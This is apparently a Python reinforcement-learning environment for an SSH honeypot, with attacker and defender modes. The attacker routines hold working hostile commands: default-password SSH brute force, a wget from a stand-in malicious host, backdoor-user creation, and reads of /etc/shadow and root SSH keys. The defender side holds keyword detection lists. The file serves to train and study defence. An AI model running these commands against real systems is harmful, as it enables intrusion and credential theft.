import gymnasium as gym
from gymnasium import spaces
import numpy as np
import requests
import json
import time
import subprocess
import paramiko
from typing import Dict, Tuple, Any, Optional
from datetime import datetime, timedelta

class HoneypotEnv(gym.Env):
    """
    OpenAI Gym environment for CyberX Honeypot
    
    Supports two modes:
    - attacker: Agent learns to compromise systems
    - defender: Agent learns to detect and mitigate attacks
    """
    
    metadata = {'render.modes': ['human', 'rgb_array']}
    
    def __init__(
        self, 
        mode: str = 'attacker',
        elasticsearch_url: str = 'http://localhost:9200',
        honeypot_host: str = 'localhost',
        honeypot_port: int = 2222,
        max_steps: int = 100
    ):
        super(HoneypotEnv, self).__init__()
        
        self.mode = mode
        self.es_url = elasticsearch_url
        self.honeypot_host = honeypot_host
        self.honeypot_port = honeypot_port
        self.max_steps = max_steps
        
        # State tracking
        self.current_step = 0
        self.episode_start_time = None
        self.ssh_client = None
        self.current_session_id = None
        self.blocked_ips = set()
        self.deployed_decoys = []
        
        # Metrics
        self.episode_rewards = []
        self.episode_actions = []
        
        # Setup spaces
        if mode == 'attacker':
            self._setup_attacker_spaces()
        elif mode == 'defender':
            self._setup_defender_spaces()
        else:
            raise ValueError(f"Invalid mode: {mode}. Must be 'attacker' or 'defender'")
    
    def _setup_attacker_spaces(self):
        """
        Attacker Actions:
        0: Brute force SSH (try common passwords)
        1: Enumerate users and services
        2: Execute recon commands (whoami, uname, ls, etc.)
        3: Download fake malware
        4: Execute privilege escalation attempt
        5: Create backdoor user
        6: Modify system files
        7: Exfiltrate data (read sensitive files)
        8: Port scan internal network
        9: Wait/observe (passive)
        """
        self.action_space = spaces.Discrete(10)
        
        # Observation: [
        #   connection_active (0/1),
        #   commands_executed (0-100),
        #   files_accessed (0-100),
        #   privilege_level (0=none, 0.5=user, 1=root),
        #   detection_score (0-1),
        #   session_duration (0-max_steps),
        #   failed_attempts (0-50),
        #   successful_exploits (0-20)
        # ]
        self.observation_space = spaces.Box(
            low=np.array([0, 0, 0, 0, 0, 0, 0, 0]),
            high=np.array([1, 100, 100, 1, 1, self.max_steps, 50, 20]),
            dtype=np.float32
        )
        
        self.attack_state = {
            'connection_active': False,
            'commands_executed': 0,
            'files_accessed': 0,
            'privilege_level': 0.0,
            'failed_attempts': 0,
            'successful_exploits': 0
        }
    
    def _setup_defender_spaces(self):
        """
        Defender Actions:
        0: Monitor only (passive observation)
        1: Rate limit suspicious IP
        2: Temporary block IP (5 minutes)
        3: Permanent block IP
        4: Deploy additional honeypot decoy
        5: Rotate honeypot configuration
        6: Trigger alert to admin
        7: Isolate honeypot network segment
        8: Reset honeypot to clean state
        9: Engage active deception (fake data)
        """
        self.action_space = spaces.Discrete(10)
        
        # Observation: [
        #   active_connections (0-100),
        #   failed_login_attempts (0-1000),
        #   suspicious_commands (0-1000),
        #   unique_attacker_ips (0-100),
        #   avg_session_duration (0-3600 seconds),
        #   port_scan_detected (0/1),
        #   malware_downloads (0-50),
        #   privilege_escalation_attempts (0-50)
        # ]
        self.observation_space = spaces.Box(
            low=np.array([0, 0, 0, 0, 0, 0, 0, 0]),
            high=np.array([100, 1000, 1000, 100, 3600, 1, 50, 50]),
            dtype=np.float32
        )
        
        self.defense_state = {
            'alerts_triggered': 0,
            'ips_blocked': 0,
            'false_positives': 0,
            'attacks_mitigated': 0
        }
    
    def reset(self, seed: Optional[int] = None) -> Tuple[np.ndarray, dict]:
        """Reset environment to initial state"""
        super().reset(seed=seed)
        
        self.current_step = 0
        self.episode_start_time = time.time()
        self.episode_rewards = []
        self.episode_actions = []
        
        # Close any existing SSH connections
        self._close_ssh()
        
        # Reset state
        if self.mode == 'attacker':
            self.attack_state = {
                'connection_active': False,
                'commands_executed': 0,
                'files_accessed': 0,
                'privilege_level': 0.0,
                'failed_attempts': 0,
                'successful_exploits': 0
            }
        else:
            self.defense_state = {
                'alerts_triggered': 0,
                'ips_blocked': 0,
                'false_positives': 0,
                'attacks_mitigated': 0
            }
        
        observation = self._get_observation()
        info = {'step': 0, 'mode': self.mode}
        
        return observation, info
    
    def step(self, action: int) -> Tuple[np.ndarray, float, bool, bool, dict]:
        """Execute one step in the environment"""
        self.current_step += 1
        self.episode_actions.append(action)
        
        # Execute action based on mode
        if self.mode == 'attacker':
            reward, info = self._execute_attacker_action(action)
        else:
            reward, info = self._execute_defender_action(action)
        
        self.episode_rewards.append(reward)
        
        # Get new observation
        observation = self._get_observation()
        
        # Check termination conditions
        terminated = info.get('terminated', False)
        truncated = self.current_step >= self.max_steps
        
        # Add episode statistics to info
        info.update({
            'step': self.current_step,
            'cumulative_reward': sum(self.episode_rewards),
            'mode': self.mode
        })
        
        return observation, reward, terminated, truncated, info
    
    def _execute_attacker_action(self, action: int) -> Tuple[float, Dict]:
        """Execute attacker action and calculate reward"""
        info = {'action': action, 'action_name': self._get_action_name(action)}
        reward = 0.0
        
        try:
            if action == 0:  # Brute force SSH
                success, username, password = self._brute_force_ssh()
                if success:
                    reward = 20.0
                    self.attack_state['connection_active'] = True
                    self.attack_state['privilege_level'] = 0.5
                    self.attack_state['successful_exploits'] += 1
                    info['credentials'] = f"{username}:{password}"
                else:
                    reward = -2.0
                    self.attack_state['failed_attempts'] += 1
                info['success'] = success
                
            elif action == 1:  # Enumerate
                if not self.attack_state['connection_active']:
                    reward = -5.0
                    info['error'] = 'Not connected'
                else:
                    users, services = self._enumerate_system()
                    reward = 5.0 + len(users) * 0.5
                    self.attack_state['commands_executed'] += 3
                    info['users_found'] = users
                    info['services_found'] = services
                
            elif action == 2:  # Recon commands
                if not self.attack_state['connection_active']:
                    reward = -5.0
                else:
                    output = self._execute_recon_commands()
                    reward = 8.0
                    self.attack_state['commands_executed'] += 5
                    info['recon_output'] = output[:100]  # Truncate
                
            elif action == 3:  # Download malware
                if not self.attack_state['connection_active']:
                    reward = -5.0
                else:
                    success = self._download_malware()
                    if success:
                        reward = 15.0
                        self.attack_state['files_accessed'] += 1
                        self.attack_state['successful_exploits'] += 1
                    else:
                        reward = -3.0
                    info['download_success'] = success
                
            elif action == 4:  # Privilege escalation
                if not self.attack_state['connection_active']:
                    reward = -5.0
                else:
                    success = self._try_privilege_escalation()
                    if success:
                        reward = 30.0
                        self.attack_state['privilege_level'] = 1.0
                        self.attack_state['successful_exploits'] += 1
                    else:
                        reward = -4.0
                    info['escalation_success'] = success
                
            elif action == 5:  # Create backdoor
                if self.attack_state['privilege_level'] < 0.5:
                    reward = -5.0
                else:
                    success = self._create_backdoor()
                    reward = 25.0 if success else -3.0
                    info['backdoor_created'] = success
                
            elif action == 6:  # Modify system files
                if self.attack_state['privilege_level'] < 0.5:
                    reward = -5.0
                else:
                    success = self._modify_system_files()
                    reward = 18.0 if success else -2.0
                    self.attack_state['files_accessed'] += 1
                    info['modification_success'] = success
                
            elif action == 7:  # Exfiltrate data
                if not self.attack_state['connection_active']:
                    reward = -5.0
                else:
                    data = self._exfiltrate_data()
                    reward = 12.0 + len(data) * 0.1
                    self.attack_state['files_accessed'] += len(data)
                    info['data_exfiltrated'] = len(data)
                
            elif action == 8:  # Port scan
                if not self.attack_state['connection_active']:
                    reward = -5.0
                else:
                    ports = self._port_scan_internal()
                    reward = 10.0 + len(ports) * 0.5
                    info['open_ports'] = ports
                
            elif action == 9:  # Wait/observe
                reward = -0.5  # Small penalty for inaction
                info['action_result'] = 'waiting'
            
            # Calculate detection penalty
            detection_score = self._calculate_detection_score()
            if detection_score > 0.8:
                reward -= 50.0  # Severe penalty for being detected
                info['detected'] = True
                info['terminated'] = True
                self._close_ssh()
            elif detection_score > 0.5:
                reward -= detection_score * 10.0  # Proportional penalty
            
            info['detection_score'] = detection_score
            
        except Exception as e:
            reward = -10.0
            info['error'] = str(e)
            print(f"Attacker action error: {e}")
        
        return reward, info
    
    def _execute_defender_action(self, action: int) -> Tuple[float, Dict]:
        """Execute defender action and calculate reward"""
        info = {'action': action, 'action_name': self._get_action_name(action)}
        reward = 0.0
        
        try:
            if action == 0:  # Monitor
                metrics = self._get_monitoring_metrics()
                reward = 1.0  # Small reward for vigilance
                info['metrics'] = metrics
                
            elif action == 1:  # Rate limit
                attacker_ips = self._identify_attacker_ips()
                if attacker_ips:
                    self._apply_rate_limit(attacker_ips)
                    reward = 5.0 * len(attacker_ips)
                    self.defense_state['attacks_mitigated'] += len(attacker_ips)
                    info['ips_rate_limited'] = len(attacker_ips)
                else:
                    reward = -1.0  # Penalty for unnecessary action
                    self.defense_state['false_positives'] += 1
                
            elif action == 2:  # Temporary block
                attacker_ips = self._identify_attacker_ips(threshold=0.6)
                if attacker_ips:
                    self._block_ips(attacker_ips, duration=300)
                    reward = 10.0 * len(attacker_ips)
                    self.defense_state['ips_blocked'] += len(attacker_ips)
                    info['ips_temp_blocked'] = len(attacker_ips)
                else:
                    reward = -2.0
                    self.defense_state['false_positives'] += 1
                
            elif action == 3:  # Permanent block
                attacker_ips = self._identify_attacker_ips(threshold=0.8)
                if attacker_ips:
                    self._block_ips(attacker_ips, duration=None)
                    reward = 20.0 * len(attacker_ips)
                    self.defense_state['ips_blocked'] += len(attacker_ips)
                    info['ips_perm_blocked'] = len(attacker_ips)
                else:
                    reward = -5.0  # Higher penalty for aggressive false positive
                    self.defense_state['false_positives'] += 1
                
            elif action == 4:  # Deploy decoy
                success = self._deploy_honeypot_decoy()
                if success:
                    reward = 15.0
                    info['decoy_deployed'] = True
                else:
                    reward = -3.0
                
            elif action == 5:  # Rotate config
                self._rotate_honeypot_config()
                reward = 8.0
                info['config_rotated'] = True
                
            elif action == 6:  # Trigger alert
                attack_severity = self._assess_attack_severity()
                if attack_severity > 0.5:
                    reward = 12.0 * attack_severity
                    self.defense_state['alerts_triggered'] += 1
                    info['alert_triggered'] = True
                    info['severity'] = attack_severity
                else:
                    reward = -4.0
                    self.defense_state['false_positives'] += 1
                
            elif action == 7:  # Isolate network
                if self._detect_active_attack():
                    reward = 25.0
                    info['network_isolated'] = True
                else:
                    reward = -10.0  # High penalty for unnecessary isolation
                    self.defense_state['false_positives'] += 1
                
            elif action == 8:  # Reset honeypot
                self._reset_honeypot()
                reward = -8.0  # Penalty for downtime
                info['honeypot_reset'] = True
                
            elif action == 9:  # Active deception
                success = self._deploy_deception()
                reward = 10.0 if success else -2.0
                info['deception_deployed'] = success
            
            # Bonus rewards
            attacks_detected = self._count_attacks_detected()
            reward += attacks_detected * 3.0
            info['attacks_detected'] = attacks_detected
            
            # Penalty for missed attacks
            missed_attacks = self._count_missed_attacks()
            reward -= missed_attacks * 5.0
            info['missed_attacks'] = missed_attacks
            
        except Exception as e:
            reward = -8.0
            info['error'] = str(e)
            print(f"Defender action error: {e}")
        
        return reward, info
    
    def _get_observation(self) -> np.ndarray:
        """Get current state from Elasticsearch"""
        try:
            # Query recent events (last minute)
            response = requests.post(
                f"{self.es_url}/honeypot-*/_search",
                json={
                    "size": 1000,
                    "query": {
                        "range": {
                            "@timestamp": {"gte": "now-1m"}
                        }
                    },
                    "sort": [{"@timestamp": "desc"}]
                },
                timeout=5
            )
            
            if response.status_code != 200:
                return self._get_default_observation()
            
            hits = response.json().get('hits', {}).get('hits', [])
            
            if self.mode == 'attacker':
                return self._parse_attacker_observation(hits)
            else:
                return self._parse_defender_observation(hits)
                
        except Exception as e:
            print(f"Error getting observation: {e}")
            return self._get_default_observation()
    
    def _parse_attacker_observation(self, hits: list) -> np.ndarray:
        """Parse attacker observation from Elasticsearch"""
        connection_active = float(self.attack_state['connection_active'])
        commands_executed = min(self.attack_state['commands_executed'], 100)
        files_accessed = min(self.attack_state['files_accessed'], 100)
        privilege_level = self.attack_state['privilege_level']
        detection_score = self._calculate_detection_score()
        session_duration = self.current_step
        failed_attempts = min(self.attack_state['failed_attempts'], 50)
        successful_exploits = min(self.attack_state['successful_exploits'], 20)
        
        return np.array([
            connection_active,
            commands_executed,
            files_accessed,
            privilege_level,
            detection_score,
            session_duration,
            failed_attempts,
            successful_exploits
        ], dtype=np.float32)
    
    def _parse_defender_observation(self, hits: list) -> np.ndarray:
        """Parse defender observation from Elasticsearch"""
        # Count active connections
        sessions = set()
        failed_logins = 0
        suspicious_commands = 0
        src_ips = set()
        session_times = {}
        port_scan_detected = 0
        malware_downloads = 0
        priv_esc_attempts = 0
        
        for hit in hits:
            source = hit.get('_source', {})
            
            # Session tracking
            session_id = source.get('session')
            if session_id:
                sessions.add(session_id)
                timestamp = source.get('@timestamp')
                if session_id not in session_times:
                    session_times[session_id] = []
                session_times[session_id].append(timestamp)
            
            # Event counting
            eventid = source.get('eventid', '')
            if 'login.failed' in eventid:
                failed_logins += 1
            
            if 'command.input' in eventid:
                cmd = source.get('input', '').lower()
                if any(sus in cmd for sus in ['wget', 'curl', 'nc', 'bash', 'chmod', 'sudo', 'su']):
                    suspicious_commands += 1
                if 'nmap' in cmd or 'scan' in cmd:
                    port_scan_detected = 1
                if 'sudo' in cmd or 'su ' in cmd:
                    priv_esc_attempts += 1
            
            if 'file_download' in eventid:
                malware_downloads += 1
            
            # IP tracking
            src_ip = source.get('src_ip')
            if src_ip:
                src_ips.add(src_ip)
        
        # Calculate average session duration
        avg_duration = 0
        if session_times:
            durations = []
            for times in session_times.values():
                if len(times) >= 2:
                    # Simplified duration calculation
                    duration = len(times) * 10  # Approximate
                    durations.append(duration)
            avg_duration = np.mean(durations) if durations else 0
        
        return np.array([
            min(len(sessions), 100),
            min(failed_logins, 1000),
            min(suspicious_commands, 1000),
            min(len(src_ips), 100),
            min(avg_duration, 3600),
            float(port_scan_detected),
            min(malware_downloads, 50),
            min(priv_esc_attempts, 50)
        ], dtype=np.float32)
    
    def _get_default_observation(self) -> np.ndarray:
        """Return zero observation when data unavailable"""
        return np.zeros(self.observation_space.shape, dtype=np.float32)
    
    # ========== Attacker Action Implementations ==========
    
    def _brute_force_ssh(self) -> Tuple[bool, str, str]:
        """Attempt SSH brute force"""
        credentials = [
            ('root', 'root'),
            ('root', 'toor'),
            ('admin', 'admin'),
            ('root', 'password'),
            ('root', '123456')
        ]
        
        for username, password in credentials:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(
                    self.honeypot_host,
                    port=self.honeypot_port,
                    username=username,
                    password=password,
                    timeout=5
                )
                self.ssh_client = client
                return True, username, password
            except:
                continue
        
        return False, '', ''
    
    def _enumerate_system(self) -> Tuple[list, list]:
        """Enumerate users and services"""
        if not self.ssh_client:
            return [], []
        
        users = []
        services = []
        
        try:
            # Get users
            stdin, stdout, stderr = self.ssh_client.exec_command('cat /etc/passwd')
            output = stdout.read().decode()
            users = [line.split(':')[0] for line in output.split('\n') if line]
            
            # Get services
            stdin, stdout, stderr = self.ssh_client.exec_command('ps aux')
            services = ['ssh', 'bash']  # Simplified
            
        except Exception as e:
            print(f"Enumeration error: {e}")
        
        return users[:10], services[:10]  # Limit results
    
    def _execute_recon_commands(self) -> str:
        """Execute reconnaissance commands"""
        if not self.ssh_client:
            return ""
        
        commands = ['whoami', 'uname -a', 'pwd', 'ls -la', 'id']
        output = []
        
        for cmd in commands:
            try:
                stdin, stdout, stderr = self.ssh_client.exec_command(cmd)
                result = stdout.read().decode()[:100]
                output.append(f"{cmd}: {result}")
            except:
                pass
        
        return '\n'.join(output)
    
    def _download_malware(self) -> bool:
        """Simulate malware download"""
        if not self.ssh_client:
            return False
        
        try:
            stdin, stdout, stderr = self.ssh_client.exec_command(
                'wget http://malicious.example.com/payload.sh -O /tmp/payload.sh'
            )
            return True
        except:
            return False
    
    def _try_privilege_escalation(self) -> bool:
        """Attempt privilege escalation"""
        if not self.ssh_client:
            return False
        
        try:
            stdin, stdout, stderr = self.ssh_client.exec_command('sudo -l')
            output = stdout.read().decode()
            # In Cowrie, this might succeed in fake environment
            return 'root' in output.lower()
        except:
            return False
    
    def _create_backdoor(self) -> bool:
        """Create backdoor user"""
        if not self.ssh_client:
            return False
        
        try:
            stdin, stdout, stderr = self.ssh_client.exec_command(
                'useradd -m -s /bin/bash backdoor && echo "backdoor:password" | chpasswd'
            )
            return stdout.channel.recv_exit_status() == 0
        except:
            return False
    
    def _modify_system_files(self) -> bool:
        """Modify system configuration files"""
        if not self.ssh_client:
            return False
        
        try:
            stdin, stdout, stderr = self.ssh_client.exec_command(
                'echo "malicious_entry" >> /etc/hosts'
            )
            return True
        except:
            return False
    
    def _exfiltrate_data(self) -> list:
        """Read sensitive files"""
        if not self.ssh_client:
            return []
        
        files = ['/etc/passwd', '/etc/shadow', '/root/.ssh/id_rsa', '/home/*/.bash_history']
        exfiltrated = []
        
        for file_path in files:
            try:
                stdin, stdout, stderr = self.ssh_client.exec_command(f'cat {file_path}')
                data = stdout.read().decode()
                if data:
                    exfiltrated.append(file_path)
            except:
                pass
        
        return exfiltrated
    
    def _port_scan_internal(self) -> list:
        """Scan internal network"""
        if not self.ssh_client:
            return []
        
        try:
            stdin, stdout, stderr = self.ssh_client.exec_command(
                'for port in 22 80 443 3306 5432; do nc -zv localhost $port 2>&1; done'
            )
            output = stdout.read().decode()
            # Parse open ports
            return [22, 80, 3306]  # Simplified
        except:
            return []
    
    # ========== Defender Action Implementations ==========
    
    def _get_monitoring_metrics(self) -> dict:
        """Get current monitoring metrics"""
        try:
            response = requests.post(
                f"{self.es_url}/honeypot-*/_search",
                json={
                    "size": 0,
                    "query": {"range": {"@timestamp": {"gte": "now-5m"}}},
                    "aggs": {
                        "event_types": {"terms": {"field": "eventid.keyword"}},
                        "unique_ips": {"cardinality": {"field": "src_ip.keyword"}}
                    }
                }
            )
            data = response.json()
            return {
                'total_events': data['hits']['total']['value'],
                'unique_ips': data['aggregations']['unique_ips']['value']
            }
        except:
            return {}
    
    def _identify_attacker_ips(self, threshold: float = 0.5) -> list:
        """Identify attacker IPs based on suspicious activity"""
        try:
            response = requests.post(
                f"{self.es_url}/honeypot-*/_search",
                json={
                    "size": 0,
                    "query": {"range": {"@timestamp": {"gte": "now-2m"}}},
                    "aggs": {
                        "ips": {
                            "terms": {"field": "src_ip.keyword", "size": 50},
                            "aggs": {
                                "failed_logins": {
                                    "filter": {"term": {"eventid.keyword": "cowrie.login.failed"}}
                                }
                            }
                        }
                    }
                }
            )
            
            buckets = response.json()['aggregations']['ips']['buckets']
            attackers = []
            
            for bucket in buckets:
                total = bucket['doc_count']
                failed = bucket['failed_logins']['doc_count']
                if total > 5 and (failed / total) > threshold:
                    attackers.append(bucket['key'])
            
            return attackers
        except:
            return []
    
    def _apply_rate_limit(self, ips: list):
        """Apply rate limiting (simulated)"""
        for ip in ips:
            print(f"Rate limiting IP: {ip}")
            # In real implementation, configure iptables or firewall
    
    def _block_ips(self, ips: list, duration: Optional[int]):
        """Block IPs (simulated)"""
        for ip in ips:
            self.blocked_ips.add(ip)
            print(f"Blocking IP: {ip} for {duration}s" if duration else f"Permanently blocking: {ip}")
            # In real implementation: iptables -A INPUT -s {ip} -j DROP
    
    def _deploy_honeypot_decoy(self) -> bool:
        """Deploy additional honeypot decoy"""
        decoy_id = f"decoy_{len(self.deployed_decoys)}"
        self.deployed_decoys.append(decoy_id)
        print(f"Deployed decoy: {decoy_id}")
        return True
    
    def _rotate_honeypot_config(self):
        """Rotate honeypot configuration"""
        print("Rotating honeypot configuration")
        # Change SSH banner, hostnames, fake filesystem, etc.
    
    def _assess_attack_severity(self) -> float:
        """Assess severity of ongoing attack"""
        try:
            response = requests.post(
                f"{self.es_url}/honeypot-*/_search",
                json={
                    "size": 0,
                    "query": {"range": {"@timestamp": {"gte": "now-1m"}}},
                    "aggs": {
                        "severity_indicators": {
                            "filters": {
                                "filters": {
                                    "high": {"terms": {"eventid.keyword": ["cowrie.session.file_download", "cowrie.command.success"]}},
                                    "medium": {"term": {"eventid.keyword": "cowrie.login.failed"}}
                                }
                            }
                        }
                    }
                }
            )
            
            data = response.json()['aggregations']['severity_indicators']['buckets']
            high = data['high']['doc_count']
            medium = data['medium']['doc_count']
            
            severity = (high * 0.8 + medium * 0.3) / 100
            return min(severity, 1.0)
        except:
            return 0.0
    
    def _detect_active_attack(self) -> bool:
        """Detect if active attack is ongoing"""
        severity = self._assess_attack_severity()
        return severity > 0.6
    
    def _reset_honeypot(self):
        """Reset honeypot to clean state"""
        print("Resetting honeypot (simulated downtime)")
        # In real implementation: docker restart cyberx-cowrie
    
    def _deploy_deception(self) -> bool:
        """Deploy active deception techniques"""
        print("Deploying deception (fake files, honeytokens)")
        return True
    
    def _count_attacks_detected(self) -> int:
        """Count attacks successfully detected this step"""
        # Check if defender caught attacker actions
        return self.defense_state.get('attacks_mitigated', 0)
    
    def _count_missed_attacks(self) -> int:
        """Count attacks that went undetected"""
        # Compare actual attacks vs detected
        return 0  # Simplified
    
    # ========== Utility Methods ==========
    
    def _calculate_detection_score(self) -> float:
        """Calculate likelihood of attacker being detected (0-1)"""
        score = 0.0
        
        # More commands = higher detection
        score += min(self.attack_state['commands_executed'] / 50, 0.3)
        
        # Failed attempts raise suspicion
        score += min(self.attack_state['failed_attempts'] / 20, 0.3)
        
        # File access is suspicious
        score += min(self.attack_state['files_accessed'] / 30, 0.2)
        
        # Query Elasticsearch for failed events
        try:
            response = requests.post(
                f"{self.es_url}/honeypot-*/_search",
                json={
                    "size": 0,
                    "query": {
                        "bool": {
                            "must": [
                                {"range": {"@timestamp": {"gte": "now-1m"}}},
                                {"terms": {"eventid.keyword": ["cowrie.login.failed", "cowrie.command.failed"]}}
                            ]
                        }
                    }
                }
            )
            failed_count = response.json()['hits']['total']['value']
            score += min(failed_count / 10, 0.2)
        except:
            pass
        
        return min(score, 1.0)
    
    def _get_action_name(self, action: int) -> str:
        """Get human-readable action name"""
        if self.mode == 'attacker':
            actions = [
                'brute_force', 'enumerate', 'recon', 'download_malware',
                'privilege_escalation', 'create_backdoor', 'modify_files',
                'exfiltrate', 'port_scan', 'wait'
            ]
        else:
            actions = [
                'monitor', 'rate_limit', 'temp_block', 'perm_block',
                'deploy_decoy', 'rotate_config', 'alert', 'isolate',
                'reset', 'deception'
            ]
        return actions[action] if action < len(actions) else 'unknown'
    
    def _close_ssh(self):
        """Close SSH connection"""
        if self.ssh_client:
            try:
                self.ssh_client.close()
            except:
                pass
            self.ssh_client = None
            self.attack_state['connection_active'] = False
    
    def render(self, mode='human'):
        """Render environment state"""
        if mode == 'human':
            print(f"\n{'='*50}")
            print(f"Step: {self.current_step}/{self.max_steps}")
            print(f"Mode: {self.mode.upper()}")
            print(f"Cumulative Reward: {sum(self.episode_rewards):.2f}")
            
            if self.mode == 'attacker':
                print(f"Connection: {'Active' if self.attack_state['connection_active'] else 'Inactive'}")
                print(f"Commands: {self.attack_state['commands_executed']}")
                print(f"Privilege: {self.attack_state['privilege_level']}")
                print(f"Detection Score: {self._calculate_detection_score():.2f}")
            else:
                print(f"Alerts: {self.defense_state['alerts_triggered']}")
                print(f"IPs Blocked: {self.defense_state['ips_blocked']}")
                print(f"Attacks Mitigated: {self.defense_state['attacks_mitigated']}")
            
            print('='*50)
    
    def close(self):
        """Cleanup resources"""
        self._close_ssh()
        print("Environment closed")
